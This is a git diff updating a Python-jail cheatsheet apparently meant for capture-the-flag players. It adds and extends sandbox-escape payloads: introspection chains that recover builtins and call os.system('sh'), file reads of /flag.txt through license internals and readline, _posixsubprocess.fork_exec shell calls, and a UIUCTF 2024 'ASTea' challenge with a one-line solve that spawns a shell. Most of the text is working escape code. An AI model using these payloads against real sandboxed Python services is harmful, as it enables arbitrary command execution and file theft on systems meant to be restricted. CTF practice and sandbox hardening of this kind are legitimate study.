@@ -1,6 +1,6 @@
 ---
 title: 'Pyjail Cheatsheet'
-date: '2024-07-22'
+date: '2024-07-25'
 category: 'cheatsheet'
 description: ""
 tags:
@@ -24,10 +24,9 @@ __import__.__self__
 # obtain builtins from site-module constants
 # https://docs.python.org/3/library/constants.html#constants-added-by-the-site-module
 help.__call__.__builtins__ # or __globals__
-help.__repr__.__globals__["sys"] #
+help.__repr__.__globals__["sys"] # can chain with sys.modules
 license.__repr__.__builtins__ # or __globals__
-license.__repr__.__globals__["sys"] #
-
+license.__repr__.__globals__["sys"] # can chain with sys.modules
 
 # obtain the builtins from a defined function
 func.__globals__['__builtins__']
@@ -62,6 +61,11 @@ raise Exception(*open("/flag.txt"))
 # to stdout
 help(*open("/flag.txt"))
 print(*open("/flag.txt")
+
+# https://book.hacktricks.xyz/generic-methodologies-and-resources/python/bypass-python-sandboxes#read-file-with-builtins-help-and-license
+license._Printer__filenames = ['/flag.txt']
+license()
+# [license() for license._Printer__filenames in [['/flag.txt']]]
 ```
 
 ### subclasses
@@ -97,7 +101,7 @@ print(*open("/flag.txt")
 ### popular modules
 ```py
 # sys
-sys.modules["module_name"] # contains most of the builtin modules (https://docs.python.org/3/library/index.html)
+sys.modules["module_name"] # contains most of the builtin modules alongside frozen imports (https://docs.python.org/3/library/index.html)
 sys.breakpointhook() # same as breakpoint()
 sys._getframe().f_globals["__builtins__"].__import__("os").system("sh")
 
@@ -170,12 +174,14 @@ import readline
 readline.read_history_file("/flag.txt")
 print(readline.get_history_item(1))
 
-import _posixsubprocess # python 3.10, may differ in other versions
+import _posixsubprocess
 errpipe_read, errpipe_write = os.pipe()
+# python 3.10, may differ in other versions
 _posixsubprocess.fork_exec(["/bin/sh", "-c", "cat /flag.txt"], [b"/bin/sh"], True, (), None, None, -1, -1, -1, -1, -1, -1, errpipe_read, errpipe_write, False, False, None, None, None, -1, None)
 
-import subprocess # python 3.10, may differ in other versions
+import subprocess
 errpipe_read, errpipe_write = os.pipe()
+# python 3.10, may differ in other versions
 subprocess._posixsubprocess.fork_exec(["/bin/sh", "-c", "cat /flag.txt"], [b"/bin/sh"], True, (), None, None, -1, -1, -1, -1, -1, -1, errpipe_read, errpipe_write, False, False, None, None, None, -1, None)
 
 import multiprocessing.util # underlying uses _posixsubprocess
@@ -192,6 +198,9 @@ class cobj:...
 ```py
 # walrus operator (>= python3.8)
 [a:=().__doc__, print(a)]
+
+# lambda
+(lambda a: print(a))(().__doc__) # note that argument names aren't part of co_names
 
 # setattr
 setattr(cobj, "field", "value"), print(cobj.field)
@@ -215,10 +224,10 @@ obj.__getattribute__("field")
 
 # vars() and |=
 x = vars()
-x |= vars(tuple) # add attributes of tuple into vars (concat)
+x |= vars(tuple) # add attributes of tuple into vars (concat) -> same as (x := x|vars(tuple))
 l = *(y for y in list(vars()) if chr(98) in y), # ("__builtins__", "__getattribute__") - retrieve keys with underscore in name
-b = __getitem__(l, 0) # __builtins__ - could have shorten into l[0]
-x |= vars(dict); bu = __getitem__(vars(), b) # <module 'builtins' (built-in)> - could have shorten into x[b]
+b = __getitem__(l, 0) # __builtins__ - could have shorten into l[0] if [] is available
+x |= vars(dict); bu = __getitem__(vars(), b) # <module 'builtins' (built-in)> - could have shorten into x[b] here aswell
 l = *(y for y in list(vars(bu)) if chr(98) in y and chr(97) in y and chr(112) in y and chr(75) not in y), # ("breakpoint") - retrieve "breakpoint"
 x |= vars(tuple); brs = __getitem__(l, 0) # breakpoint
 x |= vars(dict)
@@ -288,6 +297,7 @@ print(delete_me) # error
 ```py
 # @salvatore-abello - type.__subclasses__(type)[0] -> <class 'abc.ABCMeta'>
 ().__class__.__class__.__subclasses__(().__class__.__class__)[0].register.__builtins__["breakpoint"]()
+().__class__.__class__.__subclasses__(().__class__.__class__)[0].register.__builtins__["__import__"]("os").system("sh")
 ```
 
 ### finding sinks from modules
@@ -321,6 +331,49 @@ print(delete_me) # error
         - `[].__class__.__class__("cobj", [].__class__.__bases__.__class__([[].__class__.__base__]), "".__class__.__dict__.copy().__class__())()`
 
 ## CTF
+
+### UIUCTF 2024: ASTea
+- `chall.py`
+```py
+import ast
+
+def safe_import():
+  print("Why do you need imports to make tea?")
+
+def safe_call():
+  print("Why do you need function calls to make tea?")
+
+class CoolDownTea(ast.NodeTransformer):
+  def visit_Call(self, node: ast.Call) -> ast.AST:
+    return ast.Call(func=ast.Name(id='safe_call', ctx=ast.Load()), args=[], keywords=[])
+
+  def visit_Import(self, node: ast.AST) -> ast.AST:
+    return ast.Expr(value=ast.Call(func=ast.Name(id='safe_import', ctx=ast.Load()), args=[], keywords=[]))
+
+  def visit_ImportFrom(self, node: ast.ImportFrom) -> ast.AST:
+    return ast.Expr(value=ast.Call(func=ast.Name(id='safe_import', ctx=ast.Load()), args=[], keywords=[]))
+
+  def visit_Assign(self, node: ast.Assign) -> ast.AST:
+    return ast.Assign(targets=node.targets, value=ast.Constant(value=0))
+
+  def visit_BinOp(self, node: ast.BinOp) -> ast.AST:
+    return ast.BinOp(left=ast.Constant(0), op=node.op, right=ast.Constant(0))
+
+code = input('Nothing is quite like a cup of tea in the morning: ').splitlines()[0]
+
+cup = ast.parse(code)
+print(ast.dump(cup, indent=4))
+cup = CoolDownTea().visit(cup)
+ast.fix_missing_locations(cup)
+
+exec(compile(cup, '', 'exec'), {'__builtins__': {}}, {'safe_import': safe_import, 'safe_call': safe_call})
+```
+- `solve.py`
+```py
+(a:=lambda:..., b:=safe_import.__builtins__["help"]); a.__globals__["__builtins__"] |= {"safe_import": safe_import, "safe_call": safe_call, "help": b}; [help["sh"] for help.__class__.__getitem__ in [help["os"].system for help.__class__.__getitem__ in [safe_import.__builtins__["__import__"]]]]
+
+(a:=lambda:..., b:=safe_import.__builtins__["help"]); __builtins__ |= safe_import.__builtins__; [help["sh"] for help.__class__.__getitem__ in [help["os"].system for help.__class__.__getitem__ in [safe_import.__builtins__["__import__"]]]]
+```
 
 ### vsCTF 2024: llama-jail-revenge
 - `chall.py`
